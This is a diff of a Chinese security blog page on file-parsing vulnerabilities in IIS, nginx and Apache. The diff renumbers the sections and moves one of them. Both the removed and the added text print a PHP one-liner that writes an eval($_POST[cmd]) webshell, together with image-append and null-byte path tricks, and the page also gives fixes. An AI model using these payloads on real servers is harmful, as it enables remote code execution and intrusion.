@@ -18,6 +18,8 @@
 		
 
 		
+		<link href="https://ifishzz.github.io/index.xml" rel="alternate" type="application/rss+xml" title="if1sh" />
+		
 
 		
 	</head>
@@ -51,7 +53,7 @@
                     </h1>
                     <h2 class="headline">
                     Mar 7, 2019 00:00
-                    · 1048 words
+                    · 1045 words
                     · 3 minute read
                       <span class="tags">
                       
@@ -71,7 +73,7 @@
 <ul>
 <li>
 <ul>
-<li><a href="#iis解析漏洞">IIS解析漏洞</a>
+<li><a href="#0x01-iis解析漏洞">0x01 IIS解析漏洞</a>
 <ul>
 <li>
 <ul>
@@ -81,16 +83,15 @@
 <li><a href="#修复方案">修复方案</a></li>
 </ul></li>
 </ul></li>
-<li><a href="#畸形解析漏洞">畸形解析漏洞</a></li>
-<li><a href="#nginx解析漏洞">nginx解析漏洞</a>
+<li><a href="#0x02-nginx解析漏洞">0x02 nginx解析漏洞</a>
 <ul>
 <li>
 <ul>
-<li><a href="#ngnix空字节可远程执行代码漏洞">Ngnix空字节可远程执行代码漏洞</a></li>
+<li><a href="#ngnix空字节漏洞">Ngnix空字节漏洞</a></li>
 <li><a href="#修复方案-1">修复方案</a></li>
 </ul></li>
 </ul></li>
-<li><a href="#apache解析漏洞">apache解析漏洞</a>
+<li><a href="#0x03-apache解析漏洞">0x03 apache解析漏洞</a>
 <ul>
 <li>
 <ul>
@@ -99,6 +100,7 @@
 <li><a href="#修复方案-2">修复方案</a></li>
 </ul></li>
 </ul></li>
+<li><a href="#0x04-畸形解析漏洞">0x04 畸形解析漏洞</a></li>
 </ul></li>
 </ul>
 </nav>
@@ -108,7 +110,7 @@
                 <section id="post-body">
                     
 
-<h2 id="iis解析漏洞">IIS解析漏洞</h2>
+<h2 id="0x01-iis解析漏洞">0x01 IIS解析漏洞</h2>
 
 <p>IIS 6.0 解析利用方法有两种：</p>
 
@@ -139,20 +141,7 @@
 <li><p>做好权限设置，限制用户创建文件夹。</p></li>
 </ul>
 
-<h2 id="畸形解析漏洞">畸形解析漏洞</h2>
-
-<p>IIS7.5/ IIS 7.0/ Nginx &lt;8.03</p>
-
-<p>默认Fast-CGI开启状况下</p>
-
-<pre><code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd]?&gt;');?&gt;
-
-cat 1.php &gt;&gt; 1.jpg 
-</code></pre>
-
-<p>访问1.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
-
-<h2 id="nginx解析漏洞">nginx解析漏洞</h2>
+<h2 id="0x02-nginx解析漏洞">0x02 nginx解析漏洞</h2>
 
 <p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
 
@@ -162,7 +151,7 @@ cat 1.php &gt;&gt; 1.jpg
 
 <p>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p>
 
-<h4 id="ngnix空字节可远程执行代码漏洞">Ngnix空字节可远程执行代码漏洞</h4>
+<h4 id="ngnix空字节漏洞">Ngnix空字节漏洞</h4>
 
 <pre><code>/1.jpg/1.php
 /1.jpg%00.php
@@ -184,7 +173,7 @@ cat 1.php &gt;&gt; 1.jpg
 
 <p>　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p>
 
-<h2 id="apache解析漏洞">apache解析漏洞</h2>
+<h2 id="0x03-apache解析漏洞">0x03 apache解析漏洞</h2>
 
 <p>Apache 解析文件的规则是从右到左开始判断解析,直到可识别</p>
 
@@ -232,6 +221,19 @@ RewriteRule .(pHP.|pHP3.) /index.php
 RewriteRule .(PHP.|PHP3.) /index.php
 &lt;/IfModule&gt;
 </code></pre>
+
+<h2 id="0x04-畸形解析漏洞">0x04 畸形解析漏洞</h2>
+
+<p>IIS7.5/ IIS 7.0/ Nginx &lt;8.03</p>
+
+<p>默认Fast-CGI开启状况下</p>
+
+<pre><code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd]?&gt;');?&gt;
+
+cat 1.php &gt;&gt; 1.jpg 
+</code></pre>
+
+<p>访问1.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
 
                 </section>
             </article>
